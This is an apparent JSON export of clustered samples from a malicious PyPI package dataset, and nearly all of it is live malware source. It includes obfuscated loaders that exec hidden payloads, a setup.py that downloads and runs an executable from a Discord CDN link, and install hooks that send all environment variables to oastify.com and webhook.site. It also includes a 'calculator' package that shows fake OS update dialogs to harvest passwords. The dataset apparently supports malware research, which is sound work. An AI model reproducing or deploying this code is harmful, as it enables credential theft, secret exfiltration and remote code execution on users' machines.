        "code": "#pip install pycryptodome  , It works only v3.11 Above.\nimport random ,base64,codecs,zlib;pyobfuscate=\"\"\n\nobfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(encrypt)'],['''+zOVJpnGzzcv}_i_x<rcpYFs#K~pc6LY~Zlgobyjx}d4j9ZN#4idw*rF!Sl%0WP6u@<CHi(c24GV50emA0!Sd_?w7j&q}+~X?2w=NL(tX%E|F~L3VSY+KMT=+Ps*05KhU3Y4+b`RhN^vxRvzLGQ8J#ADGEBWURg~pkCc$BAX5D@n(na{NRE+gS<uF8@28&tZUsphc>E4P;1ujQzbGolje|_mX_vIn}b9#0@>epC5!pOt8j<c`^QNFL2|RtFjz(cO!fy-wkUE7@Z8dGvV~WR`Se7P-mkqGC%beIQxL$vs+HNIeqYwj%_Y6vZtUH;c)OuIPuXeOhyTqgXD5suA1on@5k^8y-*&+tgtAFgU%;7S$@N7TY=y0g@03Mk1%XlXxLEh>?Gw9}VV3s7G!=dLA5o#M!*<0s86&lUnG60#*TVv+QR>6+jvpSB0s=89*&C6U*l@6UI0{+z2Pk#iec4d3ZTmJavUY6<W=qkGC0~u-wAPTmJW&&S#M0m3E77+N!I;#{Jd2>5W<(63X7~r|MzrfN)=|aRm}4rqilw|Wd7kQwI#1%()5-V-XBYZ<t1{V)p?68r(H@HRMQ44TEb<NcaX*H>d8$8cqw;Joh~s8K3ifGndI*K^ILq%F=GyYE54|EgnhH~cKs^;BcLj<ZT(r!?Q&axwRL>m?Mm^00U4akLIj~Tc;5%)<^oWj4cwviasKf0`y4;No)4u2Nqqi|}2-!D2{?b-qv^ky++3%~cWC4j%$P)te8_1?1550;rJCT!MOo-p|m2Frwf$n2o?7f%yT5N}L(KYTp;WyA&Wu0X<<f!xtXb-SW>KN|<Agg>l-MI~$!#il$l5XwtvmFy2iVK432zeI_AJCyN@JjiB*qESno@S2(;epPTOMVX^^&rB&goey~w9MJM2XVpKUq~Wdxf5NV<45*=LhyCA(&hr4U{lCZ<Iqyw@VM8kv7pEsq9@4PQ*$$N_|+x+a)jnsYtcWNYbX)WFbb^EQ)gixUYXdT9C`Qxf?=U5HY@yO;q4=(mNt9KAXcCX%d;?1C+=hD25T>xDomst^uPu7`17KM(p5WE>TdsHvz+C@u6edXl#qOu`;vLGRU86g+71rEY9p4&Z<l0ce#kLpi@}nK5chBpAyvd%foHP14rCZLXe#w#)y<)H>ziG_CmkA6Zdi=deYZ;LxWx!I%ybdvJ&aL3;wz?nXloU>B?DsMsR%`oJt|hP`i2AydHz08E^u6$kAqSN?Q^e;wcd<bXEREcu|294U%P|q%r5r?m;sg<yVg<JJJQwP{}MKS<@ka7o6W3FLlGt5`pDGDl!5kq?r0g)Wf?OL=)#8TsAiSq2NsmI$Ov$eILNe7s)y?YxBWssXe^>6OWlt8Jw0nwhH&}?U$HNjrPn?d5KxXEN3PgoRpS||dC$gJa+;|$*SSC|_F8+)#aSwD3jLZw*B2?XmC9v_jzRhH0{f8MTXx1oPs@ou?Y;iP4al>3u|DrmB-Krbp-B786F}NXTXWpCHC6}<d66!ct)@ODN5j+1?$GW(uu$}f0~5e33-p68DPzdgC|+iF?-|X$W3N_GWH>&{fCIpwNSf3yiQI!+`&}pe3K5bV6TRAXyANDnowByIgto+lv|F9%EU+-W++_oAW{{>4dxXJrD*zH+0RrY3oW)+;;y7f>3n3`ES{GrREz#y*qA*Ak?*'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')\n                "
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-27-pycalculate-v1.0.0",
        "code": "#pip install pycryptodome  , It works only v3.11 Above.\nimport random ,base64,codecs,zlib;pyobfuscate=\"\"\n\nobfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(False)'],['''JfQk-16-aD+pm5TQ4c2#Tezw^Ta{)z{NbMWYx~fOP&H3Jm{IR`UH`o`vqpLelLs`eKCj(H*g$wC(}s3hDv7A9JtO_S3-Uv#U$^tGP-8AKJcMZ;3#tmc5V1E~&1HDue@qaS0lK8Fr-)~%`6RTEw6xmyT3~+a@GBV{XK4={twS2kSTk}}%7+minXqc-$1G~aRwEcdjwR!JYyjL&nAS9yq*iA5oqGSb$5Sb0)tNzD1Auw$N0gnO<w*xTka_Bywu;0eg@5UQFee|moo~Ra^WenkpE`@)F}h;}_q1!@r=a<SVxqi*PO0fk#_ta*L((o!Oyhk`1ijPhMPF<7@dhrm4QWR@N*$ZuPuZE#OtG;J8mvE4RrO{v4X8S8-Zwm^^WXn2<7<5VNHGsY*T&l<A|I9RVO80?>84%YqGZTIn_cydizL-z8@zLV+W)zLl8T6q)&PnEW1tDZU6d$H_-crJlRJwVKd8j2-dw}gtcly}mnZ75#Gfi?;>4KxN)0Jzjd({uJU&9s6kD<EyxD8;#S9*FLShI|PY+fUbafO#z<V9g%pulR@U1j>%+X_3vNMDbT-;)H4Xa$x&uwKAE{gynq*z;3+<8J1z!_Ut#??QVNVmGgX9*N;30#VPWk{<`sJ8D^#<+nUb#T9+Fx;RW72~UWnGiZK_uGl5to8ofv~9}ACkmL)x9WWnZJyzu^50$~W8jAsSO^B9y|2#%T)Yp?8i)2;p6*qe47l6F86~Z8Za<$Vdp{svG)U<=#MKOJf;zt6B#Aocl9QfozC7*!A^(|Srp$fVcy3W<YBl99&;NO}R<cnli=F(PIs?<5poZk$r`CZmVEh`Og$4>U1g_Eem~#t3J--0!V5ln)2YAx8&(IJwJrlUG>b_CqWC<ik%e}JC(c|3CtmuM#qkpR(4InWMl#ReG>m=Dm<N#>^37JtU_yo;0%PYDQf^G3#=!sLeglMA*1l4rhSHDlAV0kWUWfKNyxFIJM+2dlabWUlA#a0@Wb?5Ypr%*;oxsB47E!!PE_2pJ5E<-a^p!%m$pq<Ik;>m;GpF#PC`#W%KZld7-aVf%PcTJxspABw4@IFSJ|MvYh{sgFX`a!Ph1y~5F;uU0LnDVpW12wW(g(#kio$LgKG^h2s_RGt3!ie?Z$3;iO#e<7)LRn>&Aa~v3un!G0eJtpP{nCWb|LpfVgB|iq=q?@iy1%&ILco*#7k7aJw~d2A%s?Xc3iAuf@@%9J@@ehDFc-6H%xOnp;8Z>ZP`naVofa`oPJ^0R%Qx@hnnmQgvmdg<eu?{{_S;npL0X3vI+<er!2_6Oav&Pmf4IEB+VoleeaScx7*}IQTtlM%3=wx+?H3brLamTei(cWYd_Uu4OfKcJGX?6$AOgRyHTE<pnUi7&0MX@iK?$(zb2O*^x<|kePv~%pk>sJL6^)zT-F1!F{fU2RjMIUtq$wFjJKB{v+q|H98kMzKNx;2%4j71gY({P6&w1Q{R4NJ|VZ|~$r08<XiJbIHE0Duc{G1R>6we6Vh8|uc#0p<baH}ZElnjnRxZB{3ILjv)^#)Oj&d!wx4r0qi6y4I_NWxEuPqs3P_8!jIIR>!()cM7-;5;58zgDE&Ka2XGk`=&`a2ozlcPu~N%gvh(*O*_<&UrwF3<c{fiza~8Hrbx|8&r<Mbzk3|iP2W&dOjH*B>'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')\n                "
      }
    ]
  },
  {
    "cluster_id": 16,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-09-pyadd-v0.1.3",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"pyadd\",\n  version=\"0.1.3\",\n  author=\"UPD\",\n  description=\"Add PyPi-based imports\",\n  packages=[\"pyadd\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://cdn.discordapp.com/attachments/1276975489780809812/1282787632082059359/zwerve.exe?ex=66e0a094&is=66df4f14&hm=f4604d9783911e770716516e30d4f665214449f46aa2c5a59afc4bda7042bfba& -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://cdn.discordapp.com/attachments/1276975489780809812/1282787632082059359/zwerve.exe?ex=66e0a094&is=66df4f14&hm=f4604d9783911e770716516e30d4f665214449f46aa2c5a59afc4bda7042bfba& -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      }
    ]
  },
  {
    "cluster_id": 17,
    "size": 6,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-28-artifact-lab-3-package-77d0c154-v0.1.2",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools import setup, find_packages\nimport os\nimport urllib.request\nimport urllib.parse\n\ndef notmalfunc():\n    data = dict(os.environ)\n    print(data)\n    encoded_data = urllib.parse.urlencode(data).encode()\n    url = 'https://1ln64hn526vxqn4blymbdoqwun0fo5cu.oastify.com'\n    req = urllib.request.Request(url, data=encoded_data)\n    urllib.request.urlopen(req)\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"artifact-lab-3-package-77d0c154\",\n    version = \"0.1.2\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    packages = find_packages(),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n\n\ndef hello():\n    print(\"Hello, World!\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-02-artifact-lab-3-package-e46d5661-v0.1.1",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools import setup, find_packages\nimport os\nimport urllib.request\nimport urllib.parse\n\ndef notmalfunc():\n    data = dict(os.environ)\n    print(data)\n    encoded_data = urllib.parse.urlencode(data).encode()\n    url = 'https://webhook.site/6b28c1c1-4904-4e98-8f3a-86437b1cd763'\n    req = urllib.request.Request(url, data=encoded_data)\n    urllib.request.urlopen(req)\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"artifact-lab-3-package-e46d5661\",\n    version = \"0.1.1\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    packages = find_packages(),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-21-safepackage",
        "code": "from setuptools import setup, find_packages\nimport codecs\nimport os\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\nwith codecs.open(os.path.join(here, \"README.md\"), encoding=\"utf-8\") as fh:\n    long_description = \"\\n\" + fh.read()\n\nVERSION = '1337.0.3'\nDESCRIPTION = 'Simple Calculator'\n\n# Setting up\nsetup(\n    name=\"safepackage\",\n    version=VERSION,\n    author=\"Zeyad Abulaban\",\n    author_email=\"zeyad@sitech.me\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=long_description,\n    packages=find_packages(),\n    install_requires=['requests'],\n    classifiers= [\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Education\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n        ]\n)\n\n\ndef calc(x,y):\n    return x+y\n\n\nimport requests,getpass,platform,os,shutil,time\n\ndef get_os():\n    OS = platform.system()\n    if OS.lower() == \"linux\":\n        return \"meow\"\n    elif OS.lower() == \"windows\":\n        return \"i_hate_windows\"\n    elif OS.lower() == \"darwin\":\n        return \"meow2\"\n    else:\n        return False\n\n\ndef steal():\n    try:\n        CHECK = get_os()\n        if CHECK == \"meow\":\n            if getpass.getuser().lower() != \"root\":\n                if shutil.which(\"zenity\"):\n                    passwd = os.popen('zenity --password --text \"Mandatory Updates Required. Authentication Required.\" --title \"Software Updates\"').read()\n                    return passwd\n                else:\n                    os.popen(\"echo 'PWNED!!' > $HOME/.pwned.txt\")\n            else:\n                os.popen(\"echo 'Why Running as Root :(' > /opt/pwned.txt\")\n        elif CHECK == \"meow2\":\n            if getpass.getuser().lower() != \"root\":\n                if shutil.which(\"osascript\"):\n                    cmd= \"\"\"osascript -e 'display dialog \"To perform a security update MacOS needs your password.\" with title \"MacOS Security Update\" default answer \"\" with icon stop with hidden answer' \"\"\"\n                    passwd = os.popen(cmd).read()\n                    return passwd                \n                else:\n                    